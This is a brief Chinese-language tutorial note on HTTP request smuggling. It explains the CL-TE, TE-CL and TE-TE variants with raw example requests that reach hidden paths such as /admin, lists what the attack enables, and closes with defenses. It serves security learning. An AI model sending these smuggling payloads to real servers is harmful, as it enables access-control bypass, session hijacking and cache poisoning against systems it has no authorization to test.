# HTTP 请求走私

## 原理
前端代理(LB/CDN)与后端对 HTTP 解析差异

## CL-TE
前端用 Content-Length，后端用 Transfer-Encoding
```http
POST / HTTP/1.1
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

## TE-CL
前端用 Transfer-Encoding，后端用 Content-Length
```http
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /smuggle HTTP/1.1
Host: target.com
Content-Length: 15

x=1
0
```

## TE-TE
对 Transfer-Encoding 值的解析差异
```
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding:[tab]chunked
```

## 利用
会话劫持、XSS绕过CSP、缓存投毒、权限绕过

## 防御
统一 HTTP 解析器、禁用 HTTP/1.1 降级、使用 HTTP/2
